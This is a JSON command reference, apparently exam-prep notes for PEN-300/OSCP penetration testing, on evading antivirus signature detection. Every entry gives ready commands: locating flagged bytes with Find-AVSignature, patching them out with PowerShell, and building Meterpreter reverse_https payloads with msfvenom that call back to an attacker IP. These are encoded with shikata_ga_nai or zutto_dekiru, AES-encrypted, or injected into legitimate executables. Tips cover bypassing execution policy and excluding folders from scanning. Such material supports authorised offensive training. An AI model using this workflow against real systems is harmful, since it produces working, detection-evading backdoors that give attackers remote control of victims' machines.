{
  "category": "Signature Evasion",
  "description": "Binary signature detection and evasion techniques. Includes Find-AVSignature for locating flagged bytes and msfvenom encoding/encryption for payload obfuscation.",
  "commands": [
    {
      "id": "find-av-signature",
      "name": "Find-AVSignature (Binary Signature Location)",
      "description": "PowerShell script to locate exact byte offsets flagged by antivirus. Uses binary search (split-and-scan) to narrow down signature location in executable files.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "signature-detection",
        "powershell",
        "binary-analysis"
      ],
      "command": "Import-Module .\\Find-AVSignature.ps1\nFind-AVSignature -StartByte 0 -EndByte max -Interval <INTERVAL> -Path <TARGET_FILE> -OutPath <OUTPUT_DIR> -Verbose -Force",
      "variables": [
        {
          "name": "<INTERVAL>",
          "description": "Byte interval for binary search (start large: 10000, then narrow: 1000, 100, 10, 1)",
          "example": "10000",
          "required": true
        },
        {
          "name": "<TARGET_FILE>",
          "description": "Executable file to analyze (full path)",
          "example": "C:\\Tools\\payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT_DIR>",
          "description": "Directory for test file output",
          "example": "C:\\Tools\\avtest",
          "required": true
        }
      ],
      "notes": "Syntax: Run on Windows with PowerShell, requires Find-AVSignature.ps1 script Time-consuming but precise. Typical workflow: 10000\u21921000\u2192100\u219210\u21921 byte intervals. Takes 15-30 minutes per signature. Practice on known-flagged payloads before exam. Time estimate: 15-30 minutes per signature References: docs/av-evasion/signature-evasion.md#find-av-signature, PEN-300 Chapter 6.3 Manual alternative: Manual binary editing with hex editor (HxD, 010 Editor), or automated tools like ThreatCheck, DefenderCheck",
      "success_indicators": [
        "Creates test files in output directory. Scan each with AV - undetected file shows safe range. Detected file shows signature range."
      ],
      "failure_indicators": [
        "Script not found - Download from GitHub or course materials",
        "Execution policy - Run: Set-ExecutionPolicy Bypass -Scope Process",
        "AV interference - Exclude output directory from real-time scanning",
        "Multiple signatures - Repeat process after fixing first signature"
      ]
    },
    {
      "id": "modify-signature-bytes",
      "name": "Modify Signature Bytes (PowerShell)",
      "description": "Overwrite flagged byte offsets in binary file. Replace identified signature bytes with nulls or random values to break AV detection.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "binary-modification",
        "powershell"
      ],
      "command": "$bytes = [System.IO.File]::ReadAllBytes('<INPUT_FILE>')\n<MODIFICATIONS>\n[System.IO.File]::WriteAllBytes('<OUTPUT_FILE>', $bytes)",
      "variables": [
        {
          "name": "<INPUT_FILE>",
          "description": "Original executable path",
          "example": "C:\\Tools\\payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Modified executable path",
          "example": "C:\\Tools\\payload_modified.exe",
          "required": true
        },
        {
          "name": "<MODIFICATIONS>",
          "description": "Byte modifications (e.g., $bytes[18867] = 0x00)",
          "example": "$bytes[18867] = 0x00",
          "required": true
        }
      ],
      "notes": "Syntax: PowerShell byte modification Only modify bytes identified by Find-AVSignature. Don't randomly modify - will corrupt exe. Test modified binary before deploying. May need multiple iterations. Time estimate: 5 minutes per modification cycle References: docs/av-evasion/signature-evasion.md#byte-modification, PEN-300 Chapter 6.3 Manual alternative: Use hex editor manually (HxD, 010 Editor, Hex Fiend), or automated patching tools",
      "success_indicators": [
        "Modified executable created. Test with AV scan - should be undetected if all signatures removed."
      ],
      "failure_indicators": [
        "Executable corrupted - Modified critical code section, not signature data",
        "Still detected - Multiple signatures exist, repeat Find-AVSignature",
        "Crashes on execution - Overwrote functional code instead of padding/data section",
        "False sense of security - AV may update signatures"
      ]
    },
    {
      "id": "msfvenom-encoder-shikata",
      "name": "msfvenom Shikata Ga Nai Encoder (x86)",
      "description": "Polymorphic XOR encoder for x86 payloads. Most well-known msfvenom encoder. Note: Heavily signatured by modern AV - use as baseline, not final solution.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "msfvenom",
        "encoder",
        "shikata-ga-nai",
        "x86"
      ],
      "command": "msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i <ITERATIONS> -f exe -o <OUTPUT_FILE>",
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "msfvenom payload name",
          "example": "windows/meterpreter/reverse_https",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "443",
          "required": true
        },
        {
          "name": "<ITERATIONS>",
          "description": "Encoding iterations (more = better obfuscation, larger payload)",
          "example": "10",
          "required": false
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output executable name",
          "example": "payload.exe",
          "required": true
        }
      ],
      "notes": "Syntax: Run on Kali Linux Shikata is famous but outdated. Don't rely on it alone. Useful as first layer before custom encryption. Know limitations for exam. Max 15-20 iterations before diminishing returns. Time estimate: 1 minute References: docs/av-evasion/signature-evasion.md#shikata-ga-nai, PEN-300 Chapter 6.4.1 Manual alternative: Use alternate encoders (zutto_dekiru, xor_dynamic), custom encryption, or obfuscation frameworks",
      "success_indicators": [
        "Encoded executable created. Note: Likely still detected by modern AV without additional evasion."
      ],
      "failure_indicators": [
        "Still detected - Shikata heavily signatured, combine with other techniques",
        "Payload fails to execute - Over-encoding can corrupt payload",
        "x86/x64 mismatch - Shikata is x86 only, use zutto_dekiru for x64"
      ]
    },
    {
      "id": "msfvenom-encoder-zutto",
      "name": "msfvenom Zutto Dekiru Encoder (x64)",
      "description": "Polymorphic encoder for x64 payloads. x64 equivalent of shikata_ga_nai. Better than no encoding but still well-known to AV vendors.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "msfvenom",
        "encoder",
        "zutto-dekiru",
        "x64"
      ],
      "command": "msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x64/zutto_dekiru -i <ITERATIONS> -f exe -o <OUTPUT_FILE>",
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "msfvenom x64 payload name",
          "example": "windows/x64/meterpreter/reverse_https",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "443",
          "required": true
        },
        {
          "name": "<ITERATIONS>",
          "description": "Encoding iterations",
          "example": "10",
          "required": false
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output executable name",
          "example": "payload64.exe",
          "required": true
        }
      ],
      "notes": "Syntax: Run on Kali Linux Use for x64 targets. Same limitations as shikata. Must combine with custom encryption or process injection for exam success. Time estimate: 1 minute References: docs/av-evasion/signature-evasion.md#zutto-dekiru, PEN-300 Chapter 6.4.1 Manual alternative: Use custom loaders with AES encryption, process injection, or shellcode encryption",
      "success_indicators": [
        "x64 encoded executable. Same limitations as shikata - likely detected without additional evasion."
      ],
      "failure_indicators": [
        "Still detected - Same issue as shikata, well-known encoder",
        "Architecture mismatch - Ensure target is 64-bit",
        "Payload corruption - Excessive iterations"
      ]
    },
    {
      "id": "msfvenom-encrypt-aes",
      "name": "msfvenom AES256 Encryption",
      "description": "AES256 encryption for msfvenom payloads. Stronger than encoding - payload encrypted with key, decrypted at runtime. Requires key management.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "msfvenom",
        "encryption",
        "aes256"
      ],
      "command": "msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> --encrypt aes256 --encrypt-key <KEY> -f exe -o <OUTPUT_FILE>",
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "msfvenom payload name",
          "example": "windows/x64/meterpreter/reverse_https",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "443",
          "required": true
        },
        {
          "name": "<KEY>",
          "description": "AES encryption key (any string)",
          "example": "MySecretKey2024",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output file name",
          "example": "payload_aes.exe",
          "required": true
        }
      ],
      "notes": "Syntax: Run on Kali Linux Better than encoding but msfvenom's built-in decryptor is signatured. For exam, use custom C# AES decryption for best results. AES good for understanding concepts. Time estimate: 1 minute References: docs/av-evasion/signature-evasion.md#aes-encryption, PEN-300 Chapter 6.4.2 Manual alternative: Custom AES implementation in C#/Python, XOR with multi-byte keys, or RC4 encryption",
      "success_indicators": [
        "AES-encrypted executable. Better evasion than encoding but decryption stub may still be signatured."
      ],
      "failure_indicators": [
        "Decryption stub detected - msfvenom's stub is known, use custom loaders",
        "Key visible in strings - Obfuscate key in custom loader",
        "Still flagged - AES alone insufficient, add heuristic evasion"
      ]
    },
    {
      "id": "msfvenom-template-injection",
      "name": "msfvenom Template Injection",
      "description": "Inject payload into legitimate Windows executable using -x flag. Payload embedded in target binary, inherits legitimate code's reputation/signature.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "msfvenom",
        "template-injection",
        "binary-patching"
      ],
      "command": "msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -x <TEMPLATE_EXE> -f exe -o <OUTPUT_FILE>",
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "msfvenom payload name",
          "example": "windows/x64/meterpreter/reverse_https",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port",
          "example": "443",
          "required": true
        },
        {
          "name": "<TEMPLATE_EXE>",
          "description": "Legitimate executable to use as template",
          "example": "/usr/share/windows-binaries/nc.exe",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output file name",
          "example": "payload_injected.exe",
          "required": true
        }
      ],
      "notes": "Syntax: Run on Kali Linux with template executable Template injection can improve trust but doesn't bypass modern AV signatures. Best used with signed/legitimate binaries. Test with and without -k flag. Transfer legitimate Windows binaries to Kali for best templates. Time estimate: 2 minutes References: docs/av-evasion/signature-evasion.md#template-injection, PEN-300 Chapter 6.4 Manual alternative: Manual PE injection with tools like CFF Explorer, PE-Bear, or custom Python scripts",
      "success_indicators": [
        "Executable with embedded payload. Template's original functionality may work (-k flag) or be replaced."
      ],
      "failure_indicators": [
        "Template corruption - Choose simple executables (calc, notepad)",
        "Architecture mismatch - Use x64 template for x64 payload",
        "Still detected - Injection method is known, combine with encryption",
        "-k flag breaks payload - Don't use -k if original functionality not needed"
      ]
    },
    {
      "id": "clamscan-test",
      "name": "ClamAV Signature Test",
      "description": "Test binary against ClamAV signatures locally. Fast offline AV testing without uploading to VirusTotal. Useful for iterative testing during signature evasion.",
      "category": "signature-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "testing",
        "clamav",
        "signature-scanning"
      ],
      "command": "cd 'C:\\Program Files\\ClamAV\\'\n.\\clamscan.exe <TARGET_FILE>",
      "variables": [
        {
          "name": "<TARGET_FILE>",
          "description": "File to scan for signatures",
          "example": "C:\\Tools\\payload.exe",
          "required": true
        }
      ],
      "prerequisites": [],
      "notes": "Syntax: Run on Windows with ClamAV installed ClamAV is free baseline test. Not comprehensive (misses many commercial signatures) but useful for rapid iteration. Don't rely solely on ClamAV - test with Defender or Avira too. Time estimate: 30 seconds per scan References: docs/av-evasion/signature-evasion.md#testing, PEN-300 Chapter 6.2 Manual alternative: Use online scanners (AntiScan.Me - doesn't distribute), VirusTotal (distributes to vendors), or Windows Defender locally",
      "success_indicators": [
        "Clean: 'OK' or '0 infected'\nDetected: Signature name and threat level"
      ],
      "failure_indicators": [
        "ClamAV not installed - Download and install from clamav.net",
        "Database outdated - Run freshclam.exe to update",
        "False negatives - ClamAV less comprehensive than commercial AV"
      ]
    }
  ],
  "oscp_relevance": "Critical for payload delivery. Msfvenom defaults are heavily signatured. Must understand encoding, encryption, and signature location for exam success.",
  "attack_chain_position": "Payload Generation, Initial Access",
  "related_categories": [
    "payload-generation",
    "msfvenom",
    "windows"
  ]
}